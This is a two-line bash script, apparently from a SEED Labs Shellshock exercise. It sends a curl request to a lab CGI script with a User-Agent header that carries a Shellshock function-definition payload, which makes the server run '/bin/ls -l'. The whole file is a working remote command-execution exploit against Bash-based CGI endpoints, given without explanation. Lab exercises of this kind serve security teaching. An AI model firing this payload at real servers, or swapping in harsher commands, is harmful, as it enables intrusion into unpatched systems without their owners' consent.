#!/bin/bash

curl -A " () { cat; }; echo; /bin/ls -l;" www.seedlab-shellshock.com/cgi-bin/vul.cgi
